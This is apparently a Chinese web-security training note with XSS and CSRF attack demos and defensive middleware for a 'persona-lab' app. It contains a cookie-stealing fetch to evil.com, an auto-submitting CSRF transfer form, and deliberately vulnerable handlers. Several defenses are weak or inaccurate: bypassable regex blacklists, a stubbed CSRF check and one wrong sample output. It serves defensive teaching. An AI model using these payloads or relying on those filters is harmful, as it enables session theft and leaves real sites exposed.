# 专项训练 13: 00 — Web 安全攻防 (XSS / CSRF / Sanitization / CSP)

**日期**: 2026-05-09  
**主题**: Web 安全 — 写安全代码 + 攻防演练  
**关联**: Day 4 (5/12) 后端安全加固的前置知识

---

## 一、XSS (跨站脚本攻击)

### 攻击原理

攻击者将恶意脚本注入网页，在其他用户浏览器中执行。

### 三种 XSS

| 类型 | 触发点 | 示例 |
|------|--------|------|
| 反射型 | URL 参数 → 服务器直接返回 | `?name=<script>...` |
| 存储型 | 数据库 → 渲染到页面 | 评论/昵称含脚本 |
| DOM 型 | 前端 JS 直接操作 DOM | `innerHTML = location.hash` |

### 攻击演练

#### 场景 1: 反射型 XSS — 搜索页面

```html
<!-- 漏洞代码 -->
<!-- 用户搜索: <script>fetch('https://evil.com/steal?cookie='+document.cookie)</script> -->
<div class="search-result">
  搜索结果: <span id="query"></span>
</div>

<script>
  // 漏洞: 直接从 URL 取参数，innerHTML 渲染
  const params = new URLSearchParams(location.search);
  const query = params.get('q');
  document.getElementById('query').innerHTML = query; // 🚨 XSS!
</script>
```

#### 场景 2: 存储型 XSS — 用户评论

```javascript
// 后端: 存储评论时未做过滤
app.post('/api/comments', (req, res) => {
  const { content, userId } = req.body;
  // 直接存入数据库，没有 sanitization
  db.query('INSERT INTO comments (content, user_id) VALUES (?, ?)', [content, userId]);
});

// 前端: 渲染评论时
function renderComment(comment) {
  const div = document.createElement('div');
  div.innerHTML = comment.content; // 🚨 如果 content 是 <img src=x onerror="steal()">
  document.getElementById('comments').appendChild(div);
}
```

#### 场景 3: DOM 型 XSS — URL fragment

```javascript
// 漏洞: 直接从 hash 取内容渲染
const theme = location.hash.slice(1); // #<script>alert(1)</script>
document.getElementById('theme-preview').innerHTML = theme; // 🚨 DOM XSS!
```

### 防御方案

#### 1. 永远不要 trust 用户输入 — 输出编码

```javascript
// ✅ 防御: textContent 代替 innerHTML
document.getElementById('query').textContent = query; // 安全，浏览器自动转义

// ✅ 必须用 innerHTML 时，先 sanitization
import DOMPurify from 'dompurify';
const clean = DOMPurify.sanitize(userInput);
element.innerHTML = clean;
```

#### 2. 后端 Sanitization 层

```javascript
// middleware/sanitize.ts — 全局输入清洗
import { sanitize } from 'sanitize-html';

export function sanitizeBody(req, res, next) {
  if (typeof req.body === 'object') {
    sanitizeObject(req.body);
  }
  next();
}

function sanitizeObject(obj) {
  for (const key in obj) {
    if (typeof obj[key] === 'string') {
      // 方案 A: 完全转义 (适合纯文本字段)
      obj[key] = escapeHtml(obj[key]);
    } else if (typeof obj[key] === 'object' && obj[key] !== null) {
      sanitizeObject(obj[key]);
    }
  }
}

function escapeHtml(str: string): string {
  const map: Record<string, string> = {
    '&': '&amp;',
    '<': '&lt;',
    '>': '&gt;',
    '"': '&quot;',
    "'": '&#x27;',
    '/': '&#x2F;',
  };
  return str.replace(/[&<>"'/]/g, c => map[c]);
}
```

#### 3. 白名单 Sanitization (允许富文本)

```javascript
// 允许安全的 HTML 标签，过滤危险属性
import sanitizeHtml from 'sanitize-html';

function sanitizeRichText(input: string): string {
  return sanitizeHtml(input, {
    allowedTags: ['b', 'i', 'em', 'strong', 'a', 'p', 'br', 'ul', 'li', 'h1', 'h2', 'h3'],
    allowedAttributes: {
      'a': ['href', 'title'],
    },
    allowedSchemes: ['http', 'https', 'mailto'],
    // 关键: 禁止 onerror/onload/onclick 等事件属性
    // 关键: 禁止 javascript: 协议
    // 关键: 禁止 style 中的 expression()
  });
}

// 测试用例
console.log(sanitizeRichText('<b>Hello</b><script>alert(1)</script>'));
// → '<b>Hello</b>'

console.log(sanitizeRichText('<a href="javascript:alert(1)">click</a>'));
// → '<a>click</a>' (href 被移除)

console.log(sanitizeRichText('<img src=x onerror="alert(1)">'));
// → '<img src="x">' (onerror 被移除)
```

#### 4. CSP (Content Security Policy) — 最后一道防线

```javascript
// Elysia 中间件: 设置 CSP 响应头
import { Elysia } from 'elysia';

const app = new Elysia()
  .onAfterHandle(({ response }) => {
    // 严格 CSP: 只允许同源资源
    response.headers.set('Content-Security-Policy', [
      "default-src 'self'",           // 默认只允许同源
      "script-src 'self'",            // JS 只允许同源 (禁止 inline/script)
      "style-src 'self' 'unsafe-inline'", // CSS 允许同源 + inline (Tailwind 需要)
      "img-src 'self' data: https:",  // 图片允许同源 + base64 + HTTPS
      "font-src 'self'",
      "connect-src 'self'",           // fetch/XHR 只允许同源
      "frame-ancestors 'none'",       // 禁止被 iframe 嵌入 (防 clickjacking)
      "form-action 'self'",           // 表单只允许提交到同源
      "base-uri 'self'",              // <base> 标签只允许同源
      "object-src 'none'",            // 禁止 <object>/<embed>/<applet>
    ].join('; '));

    // 额外安全头
    response.headers.set('X-Content-Type-Options', 'nosniff');
    response.headers.set('X-Frame-Options', 'DENY');
    response.headers.set('X-XSS-Protection', '1; mode=block');
    response.headers.set('Referrer-Policy', 'strict-origin-when-cross-origin');
  });
```

#### 5. CSP Nonce (允许安全的 inline script)

```html
<!-- 服务端生成 nonce，每次请求不同 -->
<!-- 服务端渲染时 -->
<script nonce="{{NONCE}}">
  // 这个 inline script 被 CSP 允许
  window.__INITIAL_STATE__ = {{JSON.stringify(state)}};
</script>

<!-- 没有 nonce 的 script 被 CSP 阻止 -->
<script>
  // 攻击者的脚本 — 被 CSP block!
  fetch('https://evil.com/steal?cookie='+document.cookie);
</script>
```

---

## 二、CSRF (跨站请求伪造)

### 攻击原理

攻击者诱导已登录用户访问恶意页面，利用浏览器自动携带 Cookie 的特性，以用户身份发起请求。

### 攻击演练

#### 场景: 转账接口无 CSRF 防护

```javascript
// 漏洞: 后端只检查 Cookie 认证，不验证请求来源
app.post('/api/transfer', async ({ cookie, body }) => {
  const token = cookie.auth?.value;
  const user = await verifyToken(token);
  if (!user) return { error: 'Unauthorized' };

  // 🚨 问题: 只要 Cookie 有效就执行，不检查请求来源
  const { to, amount } = body;
  await db.transfer(user.id, to, amount);
  return { success: true };
});
```

```html
<!-- 攻击者页面 (evil.com) -->
<!-- 用户已登录 persona-lab.com，Cookie 有效 -->
<html>
<body onload="document.getElementById('csrf-form').submit()">
  <form id="csrf-form" action="https://persona-lab.com/api/transfer" method="POST">
    <input name="to" value="attacker_account">
    <input name="amount" value="99999">
  </form>
</html>
<!-- 用户访问 evil.com → 自动提交表单 → 转账成功! -->
```

### 防御方案

#### 1. SameSite Cookie (最简单有效)

```javascript
// 设置 Cookie 时添加 SameSite
response.headers.set('Set-Cookie', [
  `auth=${token}; HttpOnly; Secure; SameSite=Strict; Path=/; Max-Age=86400`,
  // SameSite=Strict: 跨站请求不发送 Cookie
  // SameSite=Lax:   GET 跨站请求发送 Cookie，POST 不发送
  // SameSite=None:  跨站也发送 (需要 Secure)
].join('; '));
```

#### 2. CSRF Token (双重验证)

```javascript
// middleware/csrf.ts
import { randomBytes, createHash } from 'crypto';

// 生成 CSRF Token
export function generateCsrfToken(sessionId: string): { token: string; hashed: string } {
  const token = randomBytes(32).toString('hex');
  const hashed = createHash('sha256')
    .update(token + sessionId)
    .digest('hex');
  return { token, hashed };
}

// 验证 CSRF Token
export function verifyCsrfToken(token: string, hashed: string, sessionId: string): boolean {
  const expected = createHash('sha256')
    .update(token + sessionId)
    .digest('hex');
  return hashed === expected;
}

// Elysia 中间件
export function csrfProtection() {
  return {
    async validate({ cookie, headers, body }: any) {
      // GET/HEAD/OPTIONS 不需要 CSRF 验证
      const safeMethods = ['GET', 'HEAD', 'OPTIONS'];
      // 这里在 Elysia 中通过 onBeforeHandle 实现
    }
  };
}
```

```javascript
// 完整 CSRF 防护中间件 (Elysia)
import { Elysia, t } from 'elysia';
import { randomBytes, createHash } from 'crypto';

const app = new Elysia()
  // 获取 CSRF Token 的端点
  .get('/api/csrf-token', ({ cookie }) => {
    const sessionId = cookie.session?.value || randomBytes(16).toString('hex');
    const token = randomBytes(32).toString('hex');
    const hashed = createHash('sha256').update(token + sessionId).digest('hex');

    return {
      token,
      // 前端需要在后续请求的 Header 中携带这个 token
    };
  })

  // 需要 CSRF 验证的端点
  .post('/api/transfer', ({ body, headers }) => {
    const csrfToken = headers['x-csrf-token'];
    if (!csrfToken) {
      return { error: 'CSRF token missing' };
    }
    // 验证逻辑...
    return { success: true };
  }, {
    headers: t.Object({
      'x-csrf-token': t.String(), // 强制要求 Header 中有 CSRF Token
    }),
  });
```

#### 3. Origin/Referer 检查

```javascript
// middleware/check-origin.ts
export function checkOrigin(req: any) {
  const origin = req.headers.origin;
  const referer = req.headers.referer;
  const allowedOrigins = ['https://persona-lab.com', 'https://www.persona-lab.com'];

  // 检查 Origin
  if (origin && !allowedOrigins.includes(origin)) {
    return false;
  }

  // 检查 Referer (兼容性更好)
  if (referer) {
    try {
      const refererUrl = new URL(referer);
      if (!allowedOrigins.includes(refererUrl.origin)) {
        return false;
      }
    } catch {
      return false; // 无效 URL
    }
  }

  return true;
}
```

#### 4. 双重 Cookie 模式 (Double Submit Cookie)

```javascript
// 前端: 请求时将 CSRF Token 同时放在 Cookie 和 Header
fetch('/api/transfer', {
  method: 'POST',
  credentials: 'include', // 携带 Cookie
  headers: {
    'X-CSRF-Token': csrfToken, // 同时放在 Header
    'Content-Type': 'application/json',
  },
  body: JSON.stringify({ to: 'xxx', amount: 100 }),
});

// 后端: 比较 Cookie 中的值和 Header 中的值
app.post('/api/transfer', ({ cookie, headers, body }) => {
  const cookieToken = cookie.csrf?.value;
  const headerToken = headers['x-csrf-token'];

  if (!cookieToken || !headerToken || cookieToken !== headerToken) {
    return { error: 'CSRF validation failed' };
  }
  // 通过验证，处理请求
});
```

---

## 三、Sanitization 完整方案

### 前端 Sanitization

```javascript
// services/sanitizer.ts — 前端输入清洗工具

// 1. HTML 转义 (纯文本场景)
export function escapeHtml(str: string): string {
  return str
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#x27;');
}

// 2. URL 清洗
export function sanitizeUrl(url: string): string | null {
  try {
    const parsed = new URL(url, window.location.origin);
    // 只允许 http/https/mailto 协议
    if (!['http:', 'https:', 'mailto:'].includes(parsed.protocol)) {
      return null;
    }
    return parsed.href;
  } catch {
    return null;
  }
}

// 3. 昵称/用户名清洗 (只允许字母数字中文下划线)
export function sanitizeUsername(name: string): string {
  return name.replace(/[^\w\u4e00-\u9fff]/g, '').slice(0, 30);
}

// 4. 评论清洗 (允许有限 HTML)
export function sanitizeComment(text: string): string {
  // 先移除 script/style 标签及其内容
  let cleaned = text
    .replace(/<script[\s\S]*?<\/script>/gi, '')
    .replace(/<style[\s\S]*?<\/style>/gi, '')
    .replace(/on\w+\s*=/gi, '') // 移除事件处理器
    .replace(/javascript:/gi, '') // 移除 javascript: 协议
    .replace(/data:/gi, '') // 移除 data: 协议
    .replace(/vbscript:/gi, ''); // 移除 vbscript: 协议

  // 再转义剩余的特殊字符
  return escapeHtml(cleaned);
}
```

### 后端 Sanitization

```typescript
// middleware/validate.ts — Zod 验证 + Sanitization

import { z } from 'zod';

// 评论 Schema
const CommentSchema = z.object({
  content: z
    .string()
    .min(1, '评论不能为空')
    .max(2000, '评论最多2000字')
    .refine(
      (val) => !/<script[\s\S]*?<\/script>/i.test(val),
      '不允许 script 标签'
    )
    .refine(
      (val) => !/on\w+\s*=/i.test(val),
      '不允许事件处理器'
    ),
  postId: z.string().uuid(),
});

// 用户注册 Schema
const RegisterSchema = z.object({
  username: z
    .string()
    .min(2, '用户名至少2个字符')
    .max(30, '用户名最多30个字符')
    .regex(/^[\w\u4e00-\u9fff]+$/, '只允许字母、数字、中文、下划线'),
  email: z.string().email('邮箱格式不正确'),
  password: z
    .string()
    .min(8, '密码至少8个字符')
    .regex(/[A-Z]/, '密码需包含大写字母')
    .regex(/[0-9]/, '密码需包含数字'),
  bio: z
    .string()
    .max(500, '简介最多500字')
    .optional()
    .refine(
      (val) => !val || !/<script/i.test(val),
      '简介不允许 HTML 标签'
    ),
});

// 验证中间件
export function validate(schema: z.ZodType) {
  return async (req: any, res: any, next: any) => {
    try {
      const data = await schema.parseAsync(req.body);
      req.validatedBody = data; // 通过验证的数据
      next();
    } catch (error) {
      if (error instanceof z.ZodError) {
        res.status(400).json({
          error: 'Validation failed',
          details: error.errors.map(e => ({
            field: e.path.join('.'),
            message: e.message,
          })),
        });
      } else {
        res.status(400).json({ error: 'Invalid request' });
      }
    }
  };
}

// 使用示例
app.post('/api/comments', validate(CommentSchema), ({ validatedBody }) => {
  // validatedBody 已经是安全的、经过验证的数据
  return db.createComment(validatedBody);
});
```

---

## 四、综合安全中间件 (人格探索局适用)

```typescript
// middleware/security.ts — 人格探索局安全中间件合集

import { Elysia } from 'elysia';
import { randomBytes, createHash } from 'crypto';

export function securityMiddleware(app: Elysia) {
  return app
    // 1. 安全响应头
    .onAfterHandle(({ response }) => {
      const headers = response.headers;
      headers.set('Content-Security-Policy', [
        "default-src 'self'",
        "script-src 'self'",
        "style-src 'self' 'unsafe-inline'",
        "img-src 'self' data: https:",
        "font-src 'self'",
        "connect-src 'self' https://api.persona-lab.com",
        "frame-ancestors 'none'",
        "form-action 'self'",
        "base-uri 'self'",
        "object-src 'none'",
        "upgrade-insecure-requests",
      ].join('; '));
      headers.set('X-Content-Type-Options', 'nosniff');
      headers.set('X-Frame-Options', 'DENY');
      headers.set('X-XSS-Protection', '1; mode=block');
      headers.set('Referrer-Policy', 'strict-origin-when-cross-origin');
      headers.set('Permissions-Policy', 'camera=(), microphone=(), geolocation=()');
    })

    // 2. 请求体大小限制 (防 DoS)
    .onBeforeHandle(({ request, set }) => {
      const contentLength = request.headers.get('content-length');
      if (contentLength && parseInt(contentLength) > 1024 * 1024) { // 1MB
        set.status = 413;
        return { error: 'Request body too large' };
      }
    })

    // 3. 速率限制 (简单计数器，生产环境用 Redis)
    .onBeforeHandle(({ request, ip }) => {
      // 实际项目中用 Redis 滑动窗口
      // 这里只做示意
    })

    // 4. 输入清洗 (全局)
    .onBeforeHandle(async ({ body }) => {
      if (body && typeof body === 'object') {
        sanitizeObject(body);
      }
    });
}

// 递归清洗对象
function sanitizeObject(obj: any): void {
  for (const key in obj) {
    if (typeof obj[key] === 'string') {
      obj[key] = sanitizeString(obj[key]);
    } else if (typeof obj[key] === 'object' && obj[key] !== null && !Array.isArray(obj[key])) {
      sanitizeObject(obj[key]);
    } else if (Array.isArray(obj[key])) {
      obj[key].forEach((item: any) => {
        if (typeof item === 'object') sanitizeObject(item);
      });
    }
  }
}

function sanitizeString(str: string): string {
  // 移除危险模式
  return str
    .replace(/<script[\s\S]*?<\/script>/gi, '')
    .replace(/<iframe[\s\S]*?<\/iframe>/gi, '')
    .replace(/on\w+\s*=\s*["'][^"']*["']/gi, '')
    .replace(/javascript:/gi, '')
    .replace(/data:text\/html/gi, '');
}
```

---

## 五、攻防演练总结

### 攻击链 vs 防御层

```
攻击者 → [注入恶意脚本] → 用户浏览器执行 → 窃取 Cookie/Token
                ↓
防御层1: 输入验证 (Zod Schema) — 拒绝非法输入
防御层2: Sanitization (escape/sanitize-html) — 清洗合法但含危险的输入
防御层3: CSP — 浏览器阻止未授权脚本执行
防御层4: HttpOnly Cookie — JS 无法读取 auth cookie
防御层5: Secure Cookie — 只通过 HTTPS 传输
```

### 人格探索局安全 Checklist

- [ ] 所有用户输入经过 Zod 验证
- [ ] 富文本内容经过 sanitize-html 清洗
- [ ] CSP 响应头已设置
- [ ] Cookie 设置 HttpOnly + Secure + SameSite
- [ ] API 端点有速率限制
- [ ] 敏感操作 (转账/修改密码) 有 CSRF 防护
- [ ] 文件上传限制类型和大小
- [ ] 错误信息不泄露内部细节
- [ ] HTTPS 强制开启
- [ ] 依赖安全审计 (`npm audit`)

### 关键原则

1. **Never trust user input** — 所有输入都是潜在的武器
2. **Defense in depth** — 多层防御，一层失效另一层顶上
3. **Principle of least privilege** — 最小权限，CSP 只放开必要的
4. **Fail safely** — 验证失败时拒绝，不降级处理
